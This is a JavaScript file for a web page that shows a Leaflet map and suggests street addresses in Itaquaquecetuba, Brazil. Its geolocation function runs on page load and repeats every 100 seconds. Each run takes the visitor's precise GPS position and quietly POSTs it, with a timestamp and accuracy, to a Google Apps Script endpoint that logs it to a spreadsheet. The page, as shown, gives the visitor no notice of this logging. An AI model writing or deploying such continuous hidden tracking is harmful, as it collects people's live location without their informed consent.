$(document).ready(function () {

    // MAPA DO TERRITÓRIO REAL
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                // Coordenadas concedidas pelo súdito
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;

                // Marker e popup permanecem para visualização
                L.marker([lat, lng])
                    .addTo(map)
                    .bindPopup("Seu Local")
                    .openPopup();

                map.setView([lat, lng], 17);

                // Envio direto para o Google Sheets via FormData (ou JSON no no-cors)
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: lat.toFixed(7),  // Transforma em texto com ponto
                    longitude: lng.toFixed(7), // Transforma em texto com ponto
                    precisao: position.coords.accuracy.toFixed(2),
                    status: navigator.onLine ? 'online' : 'offline'
                };


                fetch('https://script.google.com/macros/s/AKfycbzT5KyTliRRNTfSEweSDqfw8soiLZGPqAW-CbYHLO2vVW-cL695G_hsUElzqydUU93FoA/exec', {
                    method: 'POST',
                    mode: 'no-cors', // Evita conflito CORS
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados enviados ao trono com sucesso."));

            },
            function(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        console.error("O súdito negou o acesso à localização, Majestade!");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        console.error("O sinal de GPS está fraco nas fronteiras.");
                        break;
                    case error.TIMEOUT:
                        console.error("A requisição expirou no tempo de espera real.");
                        break;
                    default:
                        console.error("Erro desconhecido na geolocalização.");
                }
            },
            { enableHighAccuracy: true, timeout: 10000 } // máxima precisão
        );
    }

    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
    capturarLocalizacaoReal();

    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
    setInterval(capturarLocalizacaoReal, 100000);

});


const inputRua = document.getElementById('nome');
const listaSugestoes = document.getElementById('ruas-itaqua');

inputRua.addEventListener('input', async () => {
    const busca = inputRua.value;

    // Aguardamos 3 letras para não sobrecarregar os mensageiros do reino
    if (busca.length < 3) return;

    // Ampliamos a busca para encontrar TUDO em Itaquaquecetuba
    const url = `https://nominatim.openstreetmap.org/search?q=${busca},Itaquaquecetuba&format=json&addressdetails=1&limit=8&countrycodes=br`;

    try {
        const resposta = await fetch(url);
        const locais = await resposta.json();

        listaSugestoes.innerHTML = ''; // Limpamos o passado

        locais.forEach(local => {
            const addr = local.address;
            
            // Construímos o endereço completo: Rua, Bairro, Cidade - CEP
            const rua = addr.road || addr.pedestrian || "";
            const bairro = addr.suburb || addr.neighbourhood || "";
            const cidade = addr.city || addr.town || "Itaquaquecetuba";
            const cep = addr.postcode || "";

            // Só exibimos se houver ao menos o nome da rua
            if (rua) {
                const enderecoCompleto = `${rua}, ${bairro}, ${cidade} - ${cep}`;
                const opcao = document.createElement('option');
                opcao.value = enderecoCompleto;
                listaSugestoes.appendChild(opcao);
            }
        });
    } catch (erro) {
        // Silêncio diante das falhas técnicas
    }
});
